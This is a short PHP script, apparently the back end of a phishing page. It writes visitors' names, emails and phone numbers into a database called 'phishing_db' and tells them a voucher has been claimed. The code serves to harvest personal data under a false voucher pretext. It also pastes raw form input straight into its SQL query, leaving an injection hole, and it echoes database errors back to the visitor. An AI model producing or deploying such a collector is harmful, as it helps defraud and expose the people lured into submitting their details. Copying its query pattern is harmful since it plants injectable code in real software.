<?php
$servername = "your_server";
$username = "your_username";
$password = "your_password";
$dbname = "phishing_db";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = $_POST['name'];
    $email = $_POST['email'];
    $phone = $_POST['phone'];

    $sql = "INSERT INTO users (name, email, phone) VALUES ('$name', '$email', '$phone')";

    if ($conn->query($sql) === TRUE) {
        echo "Your voucher has been claimed successfully!";
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}

$conn->close();
?>
